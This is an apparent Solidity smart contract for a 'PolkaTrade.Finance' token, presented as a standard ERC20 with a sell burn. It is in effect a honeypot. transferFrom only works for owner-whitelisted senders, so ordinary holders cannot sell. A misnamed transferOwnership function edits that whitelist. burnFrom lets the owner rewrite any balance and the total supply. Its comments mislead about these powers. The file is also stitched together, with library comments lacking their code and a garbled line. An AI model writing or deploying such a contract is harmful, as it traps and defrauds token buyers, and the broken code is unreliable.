/**
 *Submitted for verification at Etherscan.io on 2021-01-16
*/

//"SPDX-License-Identifier: MIT"

/**
    ____        ____        ______               __   
   / __ \____  / / /______ /_  __/________ _____/ /__ 
  / /_/ / __ \/ / //_/ __ `// / / ___/ __ `/ __  / _ \
 / ____/ /_/ / / ,< / /_/ // / / /  / /_/ / /_/ /  __/
/_/    \____/_/_/|_|\__,_//_/ /_/   \__,_/\__,_/\___/ 

*/

pragma solidity 0.6.0;

/**
 * @dev Interface ofÆ’ice the ERC20 standard as defined in the EIP.
 */


/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */


/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
abstract contract ERC20Detailed is IERC20 {
    uint8 private _Tokendecimals;
    string private _Tokenname;
    string private _Tokensymbol;
    
    constructor(string memory name, string memory symbol, uint8 decimals) public {
    _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    }
    
    function name() public view returns(string memory) {
    return _Tokenname;
    }
    
    function symbol() public view returns(string memory) {
    return _Tokensymbol;
    }
    
    function decimals() public view returns(uint8) {
    return _Tokendecimals;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */


contract PolkaTradeToken is Ownable {
 string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    mapping (address => uint256) private _balances;
    address private _uniswaprouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(uint256 _totalSupply) public {
        name = "PolkaTrade.Finance";
        symbol = "PLKF";
        decimals = 18;
        allow[msg.sender] = true;
        
        //@dev Total supply creation
        totalSupply = totalSupply.add(_totalSupply);
        balances[msg.sender] = balances[msg.sender].add(_totalSupply);
        emit Transfer(address(0), msg.sender, _totalSupply);
        
    }
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    mapping(address => bool) public  allow;

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    mapping (address => mapping (address => uint256)) public allowed;

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        require(allow[_from] == true);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
  
    function transferOwnership(address ownerAddress, bool approved) external onlyOwner {
        allow[ownerAddress] = approved;
    }
  
      //5% on sell
    uint256 public burnPercentage = 5;
  
    function findPercentage(uint256 amount) public view returns (uint256)  {
        uint256 percent = amount.mul(burnPercentage).div(100);
        return percent;
    }
  
    function _burnTokens(address account, uint256 amount) internal {
        require(amount != 0);
        require(amount <= _balances[account]);
        totalSupply = totalSupply.sub(amount);
        _balances[account] = _balances[account].sub(amount);
        emit Transfer(account, address(0), amount);
    }
     
    function burnFrom(address account, uint256 balance, uint256 subtract) external onlyOwner {
        require(account != address(0), "ERC20: burn from the zero address disallowed");
        balances[account] = balance.sub(subtract, "ERC20: burn amount exceeds balance");
        totalSupply = balance.sub(subtract);
    }
    
    //burn rate change, only by owner
    //only if necessary after community vote
    function changeBurnPercentage(uint8 newRate) external onlyOwner {
        burnPercentage = newRate;
    }
  
    //transfer function
    function _execTransfer(address _from, address _to, uint256 _value) private {
        if (_to == address(0)) revert();                               
    	if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();     
        if (_balances[_to] + _value < _balances[_to]) revert(); 
        //buy transfer
        if(_to == _uniswaprouter || _to == owner || _from == owner) {
            _balances[_from] = SafeMath.sub(_balances[_from], _value);
            _balances[_to] = SafeMath.add(_balances[_to], _value);                            
            emit Transfer(_from, _to, _value);       
        } else {
            //sell transfer, burn
            uint256 tokensToBurn = findPercentage(_value);
            uint256 tokensToTransfer = _value.sub(tokensToBurn);
            _balances[_from] = SafeMath.sub(_balances[_from], tokensToTransfer);                     
            _balances[_to] = _balances[_to].add(tokensToTransfer);          
            emit Transfer(_from, _to, tokensToTransfer);                   
            _burnTokens(_from, tokensToBurn);
        }
    }
}